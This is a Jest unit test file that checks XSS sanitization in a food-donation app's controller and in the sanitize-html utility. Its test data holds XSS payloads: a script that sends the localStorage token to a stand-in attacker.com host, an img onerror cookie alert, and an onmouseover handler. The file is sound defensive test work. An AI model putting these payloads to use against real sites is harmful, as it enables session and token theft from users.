const sanitizeHtml = require('sanitize-html');
const Donation = require('../../src/models/Donation');
const donationController = require('../../src/controllers/donationController');

jest.mock('../../src/models/Donation');

describe('Vulnerability 4: Cross-Site Scripting (XSS) Sanitization - Unit Tests', () => {
  let req, res;

  beforeEach(() => {
    req = {
      body: {},
      user: { _id: 'donor_user_123', role: 'donor' }
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn().mockReturnThis()
    };
  });

  describe('sanitize-html utility verification', () => {
    it('should strip malicious <script> tags from user inputs', () => {
      const maliciousPayload = "<script>fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))</script>Fresh Apples";
      const clean = sanitizeHtml(maliciousPayload, { allowedTags: [], allowedAttributes: {} });

      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('</script>');
      expect(clean).toContain('Fresh Apples');
    });

    it('should strip inline javascript event handlers (e.g., onerror, onload)', () => {
      const maliciousPayload = '<img src="invalid.jpg" onerror="alert(document.cookie)" />Hot Meals';
      const clean = sanitizeHtml(maliciousPayload, { allowedTags: [], allowedAttributes: {} });

      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('<img');
      expect(clean).toContain('Hot Meals');
    });
  });

  describe('donationController XSS Remediation', () => {
    it('should sanitize description and pickupAddress before saving donation to database', async () => {
      req.body = {
        foodName: '<script>alert("XSS")</script>Bakery Bread',
        quantity: 15,
        expiryDate: '2026-06-01',
        location: 'Colombo',
        pickupAddress: '<b onmouseover="alert(1)">Main Street</b>',
        description: '<script>fetch("http://attacker.com")</script>Surplus organic bread ready for pickup.'
      };

      Donation.create.mockImplementation((data) => Promise.resolve({ _id: 'donation_999', ...data }));

      await donationController.createDonation(req, res);

      expect(res.status).toHaveBeenCalledWith(201);
      expect(Donation.create).toHaveBeenCalledWith(
        expect.objectContaining({
          foodName: expect.not.stringContaining('<script>'),
          description: expect.not.stringContaining('<script>'),
          pickupAddress: expect.not.stringContaining('onmouseover')
        })
      );
    });
  });
});
